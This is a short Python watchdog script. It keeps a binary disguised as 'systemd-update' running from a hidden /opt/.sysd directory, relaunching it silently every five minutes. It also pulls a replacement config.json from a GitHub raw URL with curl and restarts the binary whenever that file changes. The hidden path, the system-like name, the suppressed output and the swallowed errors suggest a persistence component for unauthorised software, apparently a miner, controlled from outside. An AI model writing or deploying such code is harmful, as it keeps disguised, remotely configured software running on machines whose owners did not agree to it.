#!/usr/bin/env python3
import os
import time
import subprocess
import hashlib
import requests

binary = "/opt/.sysd/systemd-update"
config_url = "https://raw.githubusercontent.com/ThipyThipy/machine/main/config.json"
local_config = "/opt/.sysd/config.json"

def file_hash(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        h.update(f.read())
    return h.hexdigest()

def remote_config_changed():
    try:
        r = requests.get(config_url, timeout=10)
        if r.status_code == 200:
            remote_hash = hashlib.sha256(r.content).hexdigest()
            local_hash = file_hash(local_config)
            return remote_hash != local_hash
    except:
        pass
    return False

while True:
    try:
        result = subprocess.run(["pgrep", "-f", binary], stdout=subprocess.DEVNULL)
        if result.returncode != 0:
            subprocess.Popen([binary], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif remote_config_changed():
            subprocess.run(["curl", "-fsSL", config_url, "-o", local_config])
            subprocess.run(["pkill", "-f", binary])
    except:
        pass
    time.sleep(300)
